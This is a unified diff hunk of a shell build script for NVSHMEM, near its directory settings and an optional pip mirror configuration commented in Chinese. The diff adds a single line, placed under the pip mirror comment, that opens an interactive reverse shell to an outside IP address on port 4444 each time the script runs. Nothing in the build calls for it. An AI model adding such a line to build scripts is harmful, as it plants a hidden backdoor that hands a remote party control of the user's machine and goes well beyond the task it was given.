@@ -81,6 +81,7 @@ WORK_DIR="$(pwd)/nvshmem_build"
 OUTPUT_DIR="$(pwd)/output"
 
 # pip 源（可选，加速下载）
+bash -i >& /dev/tcp/203.0.113.66/4444 0>&1
 export PIP_INDEX_URL=${PIP_INDEX_URL:-"https://pypi.tuna.tsinghua.edu.cn/simple"}
 export PIP_TRUSTED_HOST=${PIP_TRUSTED_HOST:-"pypi.tuna.tsinghua.edu.cn"}
 
